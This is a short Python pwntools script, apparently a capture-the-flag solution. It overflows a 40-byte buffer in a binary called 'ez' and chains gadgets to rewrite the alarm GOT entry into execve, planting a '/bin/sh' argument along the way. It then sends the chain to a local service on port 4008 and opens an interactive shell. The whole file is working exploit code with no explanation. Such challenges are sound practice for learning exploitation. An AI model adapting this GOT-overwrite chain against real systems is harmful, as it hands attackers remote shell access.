from pwn import *

e = ELF("./ez")
libc = ELF("./libc.so.6")

got = e.got["alarm"]
print(f"GOT alarm: {got:08x}")

print(f"Execve offset: {libc.symbols['execve']:08x}")

dt = (libc.symbols["execve"] - libc.symbols["alarm"]) & 0xFFFFFFFFFFFFFFFF

print(f"Delta: {dt:08x}")

exitcode = e.symbols["exitcode"]
r = ROP(e)


add_ptr_rdi_rsi_ret = e.symbols["gift"]
pop_rsi_rdi_ret = e.symbols["gift2"]
prepare_for_execve = e.symbols["gift3"]

call_rax = 0x0000000000401014
ret = 0x000000000040101A

buffer_size = 0x28
binsh = u64(b"/bin/sh\x00") - 1337


def add_integer_to(addr, val):
    return p64(pop_rsi_rdi_ret) + p64(val) + p64(addr) + p64(add_ptr_rdi_rsi_ret)


padding = b"A" * (buffer_size)

chain = (
    padding
    + add_integer_to(got, dt)
    + add_integer_to(exitcode, binsh)
    + p64(pop_rsi_rdi_ret)
    + p64(got + 0x70)
    + p64(exitcode)
    + p64(prepare_for_execve)
    + p64(call_rax)
)

print(len(chain))

with open("chain.bin", "wb") as solve:
    solve.write(chain)

p = remote("localhost", 4008)  # process("./ez")
p.sendline(chain)
p.interactive()
